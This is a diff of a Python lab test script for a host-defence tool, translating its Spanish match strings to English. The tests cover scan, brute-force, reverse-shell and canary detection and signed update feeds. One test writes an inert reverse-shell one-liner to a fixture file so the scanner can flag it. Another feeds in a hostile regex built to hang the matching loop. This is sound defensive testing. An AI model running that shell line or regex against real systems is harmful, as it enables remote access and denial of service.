@@ -21,7 +21,7 @@ Modos (los orquesta lab/docker-lab.sh con un contenedor atacante separado):
   proposal-apply    aplica el cierre de contraseñas de SSH propuesto por Arx
   proposal-revert   lo deshace
   vaccine-sign      firma un paquete de prueba, otro alterado y otro de otra clave
-  vaccine-apply <pub> <valida|insuficiente>  validación en ESTE host, descargando de otra máquina
+  vaccine-apply <pub> <valid|insufficient>  validación en ESTE host, descargando de otra máquina
   vaccine-intel     una IP de vacuna conectada: se detecta y se bloquea
   forward-up        un "contenedor" con un servicio publicado por DNAT
   forward-block <ip> bloquea esa IP; el efecto se mide desde el atacante
@@ -111,7 +111,7 @@ def prep():
 
 def net_scan(ip):
     sweep()
-    found = any("escaneo desde" in i.get("detail", "") and ip in i.get("detail", "")
+    found = any("scan from" in i.get("detail", "") and ip in i.get("detail", "")
                 for i in incidents())
     blocked = ip in _nft_set("block_ipv4")
     ok = found and blocked
@@ -132,7 +132,7 @@ def release():
 
 def net_brute(ip):
     sweep()
-    found = any("fallos de autenticación desde" in i.get("detail", "")
+    found = any("authentication failures from" in i.get("detail", "")
                 and ip in i.get("detail", "") for i in incidents())
     blocked = ip in _nft_set("block_ipv4")
     ok = found and blocked
@@ -184,7 +184,7 @@ def net_revsh(ip):
     time.sleep(0.5)
     sweep()
     # el incidente se registra con kind="incident"; el tipo del hallazgo va en el detalle
-    detected = any("conexión saliente" in i.get("detail", "") and ip in i.get("detail", "")
+    detected = any("outbound connection" in i.get("detail", "") and ip in i.get("detail", "")
                    for i in incidents())
     blocked = f"{ip} . {C2_PORT}" in _nft_set("c2_out4")
     suspended = _proc_state(owner).startswith("T")
@@ -364,9 +364,9 @@ def identity():
     return 0 if ok else 1
 
 
-def _lab_answer(fp, veredicto="amenaza", confianza=92):
-    return ("Acceso desconocido en sesión viva.\nVEREDICTOS: "
-            + json.dumps([{"id": fp, "veredicto": veredicto, "confianza": confianza, "razon": "lab"}]))
+def _lab_answer(fp, verdict="threat", confidence=92):
+    return ("Unknown access in a live session.\nVERDICTS: "
+            + json.dumps([{"id": fp, "verdict": verdict, "confidence": confidence, "reason": "lab"}]))
 
 
 def identity_llm(ip):
@@ -382,7 +382,7 @@ def identity_llm(ip):
     if real is None:
         print(f"[FAIL] identidad+modelo: un acceso sin terminal de bob@{ip} no se detectó")
         return 1
-    print(f"  hechos que recibe el modelo: {guard.build_dossier([real], base)['hallazgos_nuevos'][0]['hechos']}")
+    print(f"  hechos que recibe el modelo: {guard.build_dossier([real], base)['new_findings'][0]['facts']}")
     guard._assess_with_engine = lambda new, b, c: _lab_answer(real[1]["fp"])
     slow = guard.SlowLayer(cfg, base, enforce=True)
     slow.feed([real[0]], [real[1]])
@@ -426,7 +426,7 @@ def identity_forged():
     slow = guard.SlowLayer({}, base, enforce=True)
     slow.feed([forged[0]], [forged[1]])
     untouched = sh(["passwd", "-S", "dana"]).stdout.split()[1] == "P"
-    said = "falsificar" in (slow.reports[0]["summary"] if slow.reports else "")
+    said = "forged" in (slow.reports[0]["summary"] if slow.reports else "")
     ok = untouched and said
     print(f"[{'PASS' if ok else 'FAIL'}] línea falsificada con logger: dana intacta={untouched} · el dueño lo sabe={said}")
     return 0 if ok else 1
@@ -436,7 +436,7 @@ def identity_unlock():
     from arx.modules import response
     done = response.unlock_account("bob")
     print(f"── bob desbloqueado: {done} ──")
-    return 0 if done and not done.startswith("no se pudo") else 1
+    return 0 if done and not response.revert_failed(done) else 1
 
 
 def uid0():
@@ -502,32 +502,32 @@ def proposal_apply():
     sh("grep -q sshd_config.d /etc/ssh/sshd_config || sed -i '1i Include /etc/ssh/sshd_config.d/*.conf' /etc/ssh/sshd_config")
     sh("sed -i 's/^#\\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config; pkill -HUP -x sshd || true")
     offered = [p["id"] for p in proposals.all_proposals()]
-    msg = proposals.apply_ssh("ssh-sin-contrasena")
+    msg = proposals.apply_ssh("ssh-no-password")
     time.sleep(1)
     key = sh(["ssh", "-i", "/tmp/bobkey", "-o", "StrictHostKeyChecking=no", "-o", "BatchMode=yes",
               "-o", "ConnectTimeout=5", "bob@127.0.0.1", "true"]).returncode == 0
-    ok = "ssh-sin-contrasena" in offered and msg.startswith("hecho") and key
-    print(f"[{'PASS' if ok else 'FAIL'}] propuesta: ofrecida={'ssh-sin-contrasena' in offered} · {msg[:60]}… · la llave sigue entrando={key}")
+    ok = "ssh-no-password" in offered and msg.startswith("done") and key
+    print(f"[{'PASS' if ok else 'FAIL'}] propuesta: ofrecida={'ssh-no-password' in offered} · {msg[:60]}… · la llave sigue entrando={key}")
     return 0 if ok else 1
 
 
 def proposal_revert():
     from arx.modules import proposals
-    msg = proposals.revert_ssh("ssh-sin-contrasena")
+    msg = proposals.revert_ssh("ssh-no-password")
     time.sleep(1)
     print(f"── {msg} ──")
-    return 0 if msg.startswith("deshecho") else 1
+    return 0 if msg.startswith("undone") else 1
 
 
 def _lab_feed(serial=1, revoked=()):
     return {"serial": serial, "issued": "2026-11-05T00:00:00+00:00", "revoked": list(revoked), "vaccines": [
         {"id": "lab-ip", "version": 1, "description": "IP de prueba del lab", "iocs": {"ips": ["185.220.101.50"]}},
         {"id": "lab-regla", "version": 1, "description": "minero de prueba", "iocs": {},
-         "rules": [{"id": "minero", "verdict": "malicioso", "regex": "lab-minero-[a-z]{1,8}",
+         "rules": [{"id": "minero", "verdict": "malicious", "regex": "lab-minero-[a-z]{1,8}",
                     "must_match": ["corre lab-minero-abc"], "must_not_match": ["un texto normal"]}]},
         {"id": "lab-hostil-red", "version": 1, "description": "bloquea todo", "iocs": {"ips": ["10.0.0.0/8"]}},
         {"id": "lab-hostil-regex", "version": 1, "description": "cuelga el bucle", "iocs": {},
-         "rules": [{"id": "x", "verdict": "malicioso", "regex": "(a+)+$", "must_match": ["aaa"],
+         "rules": [{"id": "x", "verdict": "malicious", "regex": "(a+)+$", "must_match": ["aaa"],
                     "must_not_match": ["b"]}]},
     ]}
 
@@ -562,7 +562,7 @@ def vaccine_apply(pub, rule_expected):
     url = "http://attacker:8000/"
     tampered = vaccines.update(pubkey=pub, cfg={"vaccine_feed_url": url + "feed.tampered.json"})
     other = vaccines.update(pubkey=pub, cfg={"vaccine_feed_url": url + "feed.other-key.json"})
-    refused = "firma" in str(tampered.get("reason")) and "firma" in str(other.get("reason"))
+    refused = "signature" in str(tampered.get("reason")) and "signature" in str(other.get("reason"))
     untouched = not vaccines._load().get("applied")
     out = vaccines.update(pubkey=pub, cfg={"vaccine_feed_url": url + "feed.signed.json"})
     if not out.get("ok"):
@@ -571,21 +571,21 @@ def vaccine_apply(pub, rule_expected):
     for r in out["rejected"]:
         print(f"  ✗ {r['id']}: {r['status']} — {r['reason']}")
     status = {r["id"]: r["status"] for r in out["rejected"]}
-    hostile = status.get("lab-hostil-red") == "hostil" and status.get("lab-hostil-regex") == "hostil"
-    rule_ok = ("lab-regla" in out["applied"]) if rule_expected == "valida" else status.get("lab-regla") == rule_expected
+    hostile = status.get("lab-hostil-red") == "hostile" and status.get("lab-hostil-regex") == "hostile"
+    rule_ok = ("lab-regla" in out["applied"]) if rule_expected == "valid" else status.get("lab-regla") == rule_expected
     ip_ok = "lab-ip" in out["applied"]
     # repetir un paquete antiguo no debe colar
     fired = False
-    if rule_expected == "valida":
+    if rule_expected == "valid":
         sample = "/work/muestra-vacuna"
         open(sample, "w").write("#!/bin/sh\n# corre lab-minero-abc\n")
-        fired = "MALICIOSO" in arx("scan", sample)
+        fired = "MALICIOUS" in arx("scan", sample)
         os.unlink(sample)
-    ok = refused and untouched and hostile and rule_ok and ip_ok and (fired or rule_expected != "valida")
+    ok = refused and untouched and hostile and rule_ok and ip_ok and (fired or rule_expected != "valid")
     print(f"[{'PASS' if ok else 'FAIL'}] vacunas en este host: alterado y otra clave rechazados={refused} · "
           f"nada aplicado antes de la firma buena={untouched} · hostiles rechazadas={hostile} · "
           f"regla {rule_expected}={rule_ok} · IP aplicada={ip_ok}"
-          + (f" · arx scan la usa={fired}" if rule_expected == "valida" else ""))
+          + (f" · arx scan la usa={fired}" if rule_expected == "valid" else ""))
     return 0 if ok else 1
 
 
@@ -609,9 +609,9 @@ def sandbox_scan():
     mal = "/work/scan-fixture-malicioso"  # inerte: NUNCA se ejecuta, solo se analiza
     with open(mal, "w") as f:
         f.write("#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.3/4444 0>&1\n")
-    mal_ok = "MALICIOSO" in arx("scan", mal)
+    mal_ok = "MALICIOUS" in arx("scan", mal)
     benign = "/tmp/miner" if os.path.exists("/tmp/miner") else "/bin/true"
-    benign_ok = "MALICIOSO" not in arx("scan", benign)
+    benign_ok = "MALICIOUS" not in arx("scan", benign)
     os.unlink(mal)
     ok = mal_ok and benign_ok
     print(f"[{'PASS' if ok else 'FAIL'}] sandbox estático: fixture malicioso detectado={mal_ok} · "
@@ -625,12 +625,12 @@ def forensics_report():
     posterior de la cronología rompe el sellado."""
     from arx.modules import forensics
     rep = forensics.build_report()
-    n = len(rep["cronologia"])
+    n = len(rep["timeline"])
     ok_intact, _ = forensics.verify(rep)
     tampered = json.loads(json.dumps(rep))
     broke = True
-    if tampered["cronologia"]:
-        tampered["cronologia"][0]["detail"] = "borrado por el intruso"
+    if tampered["timeline"]:
+        tampered["timeline"][0]["detail"] = "borrado por el intruso"
         valid, _ = forensics.verify(tampered)
         broke = not valid
     ok = n > 0 and ok_intact and broke
@@ -690,7 +690,7 @@ def levels():
         from arx.modules import response
         # el humano autoriza (en la CLI real pide la palabra; aquí es el lab)
         item = response.authorize_pending(item_id)
-        restored = bool(item and "restaurado" in (item.get("executed") or ""))
+        restored = bool(item and "restored" in (item.get("executed") or ""))
         import pathlib
         quarantined = any(p.name.startswith("q-") for p in
                           pathlib.Path(config.state_dir() / "vault").glob("q-*"))
@@ -707,7 +707,7 @@ def levels():
         time.sleep(1)
         sweep()
         ok = any(i.get("kind") == "canary" or "canar" in i.get("detail", "").lower()
-                 or "señuelo" in i.get("detail", "").lower() for i in incidents())
+                  for i in incidents())
         report(9, ok, "lectura del canario detectada (atime)")
     else:
         report(9, False, "no se pudo plantar el canario en el lab")
